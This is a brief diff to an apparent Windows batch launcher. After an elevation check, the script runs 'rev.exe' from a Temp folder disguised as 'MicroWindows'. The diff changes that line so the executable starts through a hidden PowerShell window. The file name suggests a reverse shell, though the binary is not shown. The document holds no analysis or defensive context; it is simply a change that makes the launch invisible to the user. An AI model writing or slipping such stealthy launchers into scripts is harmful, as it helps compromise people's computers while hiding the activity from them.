@@ -23,4 +23,4 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 
-C:\Users\%username%\AppData\Local\Temp\MicroWindows\rev.exe
+powershell -windowstyle hidden C:\Users\%username%\AppData\Local\Temp\MicroWindows\rev.exe
